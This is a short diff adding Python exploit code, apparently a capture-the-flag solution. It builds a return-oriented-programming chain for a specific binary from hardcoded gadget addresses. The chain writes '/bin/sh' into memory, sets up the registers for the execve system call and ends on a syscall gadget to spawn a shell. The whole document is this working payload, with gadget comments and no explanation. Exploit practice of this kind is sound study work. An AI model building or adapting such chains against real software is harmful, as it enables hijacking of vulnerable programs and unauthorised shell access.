@@ -1,0 +1,21 @@
+payload = p64(0x4072cf)
+#0x4072cf: pop rbx ; pop rbp ; ret
+payload += p64(0x6e69622f)+p64(0x4100ad)+p64(0x40125c)
+# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4072cf)
+# 0x4072cf: pop rbx ; pop rbp ; ret
+payload += p64(0x68662f)+p64(0x4100b1)+p64(0x40125c)
+# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x40840b)
+# 0x000000000040840b: pop rsi; ret; 
+payload += p64(0x0)+p64(0x407c4b)
+# 0x0000000000407c4b: mov edx, 0; test eax, eax; cmovg eax, edx; add rsp, 8; pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x408163)
+# 0x0000000000408163: pop rax; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p64(0x410070)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x408348)
+# 0x0000000000408348: xchg eax, edi; ret; 
+payload += p64(0x408163)
+# 0x0000000000408163: pop rax; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p64(0x3b)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x4064e6)
+# 0x00000000004064e6: syscall; 
+payload += b''
